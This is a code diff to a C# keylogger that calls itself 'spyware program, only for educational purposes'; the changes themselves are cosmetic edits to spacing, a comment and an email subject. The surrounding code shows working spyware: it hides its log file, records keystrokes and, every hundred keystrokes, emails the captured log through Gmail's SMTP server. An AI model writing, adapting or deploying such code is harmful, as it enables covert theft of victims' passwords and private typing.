@@ -5,8 +5,7 @@ using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
 
-
-// attention malware program, only for educational purposes
+// attention spyware program, only for educational purposes
 namespace KeyLogger
 {
     class Program
@@ -29,10 +28,7 @@ namespace KeyLogger
 
             if (!File.Exists(fileName))
             {
-                using (StreamWriter sw = File.CreateText(fileName))
-                {
-
-                }
+                using (StreamWriter sw = File.CreateText(fileName)) { }
             }
 
             File.SetAttributes(fileName, File.GetAttributes(fileName) | FileAttributes.Hidden);
@@ -55,7 +51,7 @@ namespace KeyLogger
 
                         numberOfKeyStrokes++;
 
-                        if (numberOfKeyStrokes%100 == 0)
+                        if (numberOfKeyStrokes % 100 == 0)
                         {
                             SendMessage();
                         }
@@ -72,7 +68,7 @@ namespace KeyLogger
             string logContent = File.ReadAllText(fileName);
 
             DateTime now = DateTime.Now;
-            string subject = "from Keylogger";
+            string subject = "from Keylogger + ";
 
             string emailBody = string.Empty;
 
@@ -88,7 +84,7 @@ namespace KeyLogger
             emailBody += "\ntime: " + now.ToString();
             emailBody += "\n" + logContent;
 
-            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", +587);
+            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
 
             MailMessage mailMessage = new MailMessage();
 
